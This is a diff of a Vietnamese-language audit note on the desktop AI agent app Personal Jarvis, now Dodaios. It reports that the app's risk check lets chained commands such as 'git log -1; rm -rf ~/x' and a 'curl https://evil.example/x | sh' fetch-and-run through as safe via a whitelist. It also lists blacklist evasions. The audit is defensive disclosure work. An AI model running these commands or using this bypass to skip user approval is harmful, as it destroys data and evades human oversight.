@@ -132,7 +132,7 @@ README tự cảnh báo: lần chạy đầu trên codebase lớn **tốn nhiề
 |---|---|---|
 | "Every action passes a risk check with four levels: safe, monitor, ask and block. Anything that could change your system waits for your approval" | `jarvis/safety/risk_tier.py`: thứ tự **blacklist → whitelist → tier mặc định của tool** (+ hook `risk_tier_for_args`). `config.py`: `approval_mode` mặc định **`"bypass"`**, `default_tier = "safe"`; chỉ tier `ask` mới hỏi | Mặc định là **không hỏi** cho việc do app tự chạy; README nói ngược lại. Docs `safety-and-approvals.md` có thừa nhận kết nối kế thừa "monitor default" chạy không hỏi |
 | Blacklist chặn lệnh nguy hiểm | `fnmatch` trên chuỗi `"<tool> <args>"` và `"<args>"`; blacklist mặc định chỉ 5 mẫu (`format *`, `rm -rf /`, `del /f /s /q C:\`…). Docstring ghi audit 8/8/2026 phát hiện **mọi mẫu blacklist mặc định từng "chết"** với `run_shell` | Glob khớp chuỗi dễ né (`rm -rf ~`, khoảng trắng kép, `bash -c`) |
-| Lệnh phá huỷ sẽ hỏi trước | `command_impact.py` tách `&&`, `;`, `\|` và xếp loại read/modify/destructive — **nhưng chỉ chạy ở bước 3**; whitelist mặc định có `"git log *"`, `"git diff *"` và **thắng trước** | `fnmatchcase("git log -1; rm -rf ~/x", "git log *") == True` → lệnh nối sau whitelist được hạ xuống `safe`, bỏ qua bộ phân loại (phân tích tĩnh 12/10/2026, **chưa chạy thử trong app**) |
+| Lệnh phá huỷ sẽ hỏi trước | `command_impact.py` tách `&&`, `;`, `\|` và xếp loại read/modify/destructive — **nhưng chỉ chạy ở bước 3**; whitelist mặc định có `"git log *"`, `"git diff *"` và **thắng trước** | `fnmatchcase("git log -1; rm -rf ~/x", "git log *") == True` → lệnh nối sau whitelist được hạ xuống `safe`, bỏ qua bộ phân loại (phân tích tĩnh 12/10/2026; **16/10/2026 đã gọi `RiskTierEvaluator.evaluate` thật và xác nhận**, xem §3c.5) |
 | — | `AGENTS.md` là file hướng dẫn duy nhất; `.claude/{agents,skills}` và `.codex/agents/*.toml` là bản sinh, CI (`scripts/ci/check_agents_md.py`) chặn `CLAUDE.md` | Mẫu "một nguồn, nhiều host" giống mục 04/20 |
 | — | `AGENTS.md` §1 "Traps no one guesses": working tree **dùng chung** giữa nhiều phiên agent (cấm `git add -A`); probe vào app thật **tốn tiền thật** (5 lượt test từng tốn $6,82); cấm Chrome headless (từng ghim CPU 100%); mọi reconnect phải jitter (từng cạn cổng ephemeral) | Sổ bẫy cụ thể, có mã AP-n/BUG-n — cùng tinh thần `TRAPS.md` mục 03/23 |
 
@@ -142,6 +142,33 @@ README tự cảnh báo: lần chạy đầu trên codebase lớn **tốn nhiề
 - **Rủi ro:** (1) **bus factor = 1** và nhịp 50–260 commit/ngày cho thấy phần lớn code do agent sinh — 664k dòng Python sau ~4 tháng khó audit; (2) mặc định `bypass` + whitelist thắng bộ phân loại lệnh là khoảng hở thật cho app có quyền điều khiển máy (mục 12); (3) cài bằng `curl | bash`/`irm | iex`, binary macOS chưa notarize, Windows chưa ký; (4) đổi tên repo, đổi license MIT→Apache trong 4 tháng → link/PyPI chưa đồng bộ; (5) cộng đồng nhỏ (183★), chưa có review độc lập — phần tính năng đều là **tự công bố**; (6) trùng tên với `open-jarvis/OpenJarvis` (Stanford, ~11k★, Apache-2.0, local-first nhưng thiên về framework + đo hiệu năng/năng lượng) và nhiều fork/mirror `*/PersonalJarvis`.
 - **So với nhóm ADE (§1.3):** T3 Code/Orca/Claude Squad chỉ làm "bàn điều phối" và giữ phạm vi hẹp; Personal Jarvis là cực "làm tất cả", gần OpenClaw/Hermes Agent (mục 02) hơn là một IDE. Chọn T3 Code hoặc Claude Squad nếu chỉ cần chạy agent song song; thử Personal Jarvis nếu muốn điều khiển bằng giọng nói, nhưng đặt `approval_mode = "ask"` và xoá whitelist `git log *`/`git diff *` (hoặc chỉ whitelist lệnh không tham số) trước khi giao quyền computer use.
 - **Bài học đem về kho:** (a) **call sign cho pane** là giao diện điều phối bằng giọng rẻ mà hiệu quả; (b) allowlist kiểu glob trên chuỗi lệnh phải chạy **sau** bộ tách lệnh nối, không trước (mục 12 §4); (c) stop-hook auto-commit WIP là lưới an toàn, nhưng sinh 378 commit nhiễu → nên squash trước khi merge.
+
+### 3c.5 Cập nhật 2026-10-16: ảnh README gửi lại, tên mới Dodaios, lỗ whitelist đã kiểm bằng chạy thật
+
+> Người dùng gửi lại ảnh đầu README: tiêu đề "Personal Jarvis", "The open-source AI agent super-app for your desktop…", huy hiệu pypi v3.1.1 · License Apache 2.0 · CI passing · Discord, link Install · Website · Docs · Discord · X, video `personal-jarvis-demo-2026-10-02-v2.mp4` (3:24). Đã clone lại (HEAD `ae629b4b1` 15/10/2026; 144 commit kể từ `e28f53f`).
+
+| Ô trong ảnh | Kiểm | Ghi chú (16/10/2026) |
+|---|---|---|
+| Tiêu đề "Personal Jarvis" | ⚠️ cũ | Sản phẩm đã **đổi tên thành Dodaios** trong tài liệu (#546, 12/10), giao diện (#694, 14/10) và thư mục con (#661). Gói Python vẫn là `jarvis/`, file cấu hình vẫn `jarvis.toml` |
+| "The open-source AI agent super-app for your desktop" | ⚠️ cũ | README nay viết "Dodaios is an open-source **agent OS** for your desktop… keeps you in control". Tính năng nêu trong ảnh (chạy nhiều coding agent song song, nói chuyện với máy, agent làm việc khi vắng người) vẫn có |
+| pypi v3.1.1 | ⚠️ cũ | PyPI `personal-jarvis` **3.2.0** (tag 13/10/2026); `project_urls` nay đã trỏ về repo Dodaios (12/10 còn trỏ URL cũ) |
+| License Apache 2.0 | ✅ | Từ 2.0.0; bản ≤1.6.0 vẫn MIT |
+| CI passing, Discord | — | Huy hiệu động, không kiểm được từ ảnh |
+| Link Install · Website · Docs · Discord · X | ✅ | Có trong README |
+
+**Số liệu:** 223★, 80 fork (shields 16/10/2026; 12/10 là 183★/70 fork). 140/144 commit mới do Ruben Lütke, còn lại là bot: bus factor vẫn = 1.
+
+**Lỗ whitelist (§3c.3) vẫn còn, nay đã kiểm bằng chạy thật.** Ở HEAD, `jarvis/safety/risk_tier.py` vẫn xét blacklist → **whitelist** → tier mặc định của tool; `approval_mode` mặc định vẫn `"bypass"` (`jarvis/core/config.py`). Whitelist trong code mặc định rỗng, nhưng `jarvis.toml.example` có `"git log *"`, `"git diff *"`, và script đóng gói Linux/macOS **chép file này thành `jarvis.toml` mặc định** của bản cài. Nạp đúng file `risk_tier.py` ở HEAD (chỉ stub hai module kiểu `jarvis.core.config`, `jarvis.core.protocols`) rồi gọi `evaluate` với tool `run_shell`, whitelist/blacklist lấy từ `jarvis.toml.example`:
+
+| Lệnh | Kết quả |
+|---|---|
+| `rm -rf ~/x` (đối chứng) | `tier=ask` |
+| `git log -1; rm -rf ~/x` | **`tier=safe`**, `approved_by=whitelist`, khớp `git log *` |
+| `git diff && curl https://evil.example/x \| sh` | **`tier=safe`**, `approved_by=whitelist`, khớp `git diff *` |
+
+Lệnh xoá đứng một mình bị hỏi; nối sau `git log` thì được coi là an toàn. Đây là kết luận ở **mức hàm đánh giá rủi ro**. Chưa chạy trong app đầy đủ, nên chưa loại trừ khả năng một lớp khác (bộ thực thi shell) chặn lại. README vẫn viết "Anything that could change your system waits for your approval". Commit an toàn duy nhất trong 4 ngày (`1a553dc04`, #631) chỉ ghi nguồn gốc của đích tool call, "No tier changes".
+
+**Cách xử lý:** repo có `SECURITY.md` với kênh báo riêng (GitHub private vulnerability reporting). Lỗ này nên báo qua kênh đó, không mở issue công khai. Khi dùng: đặt `approval_mode = "ask"` và xoá `git log *`, `git diff *` khỏi whitelist (§3c.4).
 
 ## 3d. Case study: FilmCraft — "Premiere Pro viết lại bằng Rust, 343K dòng từ 6 dòng, 11 ngày" (ảnh người dùng gửi, 2026-10-12)
 
